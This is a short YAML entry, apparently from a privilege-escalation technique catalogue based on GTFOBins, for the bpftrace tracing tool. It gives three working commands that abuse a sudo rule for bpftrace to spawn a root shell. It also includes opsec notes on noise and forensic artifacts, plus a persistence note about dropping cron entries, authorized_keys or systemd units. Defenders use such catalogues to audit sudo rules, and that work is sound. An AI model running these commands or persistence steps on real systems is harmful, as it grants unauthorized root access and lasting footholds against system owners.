---
name: bpftrace
capabilities:
- exec
- spawn
required_permissions:
  level: sudo
  notes: Requires sudo rule for this binary.
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: bpftrace --unsafe -e 'BEGIN {system("/bin/sh 1<&0");exit()}'
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo 'BEGIN {system("/bin/sh 1<&0");exit()}' >/path/to/temp-file
    bpftrace --unsafe /path/to/temp-file
- id: shell-3
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: bpftrace -c /bin/sh -e 'END {exit()}'
references:
- https://gtfobins.github.io/gtfobins/bpftrace/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
